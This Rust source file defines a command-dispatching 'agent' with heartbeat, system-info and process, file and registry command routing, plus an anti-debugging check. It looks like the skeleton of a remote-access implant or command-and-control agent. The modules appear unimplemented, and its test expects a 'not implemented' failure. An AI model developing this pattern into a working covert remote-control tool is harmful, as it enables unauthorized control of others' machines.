use agent_hardening::anti_debug;
use agent_modules::{file_manager, monitoring, process_manager, registry_manager};
use protocol::messages::{Command, Response};

pub struct AgentCore {
    pub id: u32,
}

impl AgentCore {
    pub fn new(id: u32) -> Self {
        Self { id }
    }

    pub async fn handle_command(&self, cmd: &Command) -> Option<Response> {
        if anti_debug::is_being_debugged() {
            println!("Warning: Agent is being debugged!");
        }

        match cmd {
            command @ Command::Execute { cmd } => {
                if cmd.starts_with("proc:") {
                    process_manager::execute(command).await
                } else if cmd.starts_with("file:") {
                    file_manager::execute(command).await
                } else if cmd.starts_with("reg:") {
                    registry_manager::execute(command).await
                } else {
                    process_manager::execute(command).await
                }
            }
            Command::GetSysInfo => monitoring::get_sysinfo().await,
            Command::Heartbeat => Some(Response::Success),
            _ => None,
        }
    }

    pub async fn heartbeat(&self) -> Response {
        Response::Success
    }
}

#[cfg(test)]
mod tests {
    use super::AgentCore;
    use protocol::messages::{Command, Response};

    #[tokio::test]
    async fn execute_commands_return_module_status() {
        let agent = AgentCore::new(1);
        let response = agent
            .handle_command(&Command::Execute {
                cmd: "proc:request".to_string(),
            })
            .await;

        assert_eq!(
            response,
            Some(Response::Failure {
                error: "process management is not implemented".to_string(),
            })
        );
    }
}
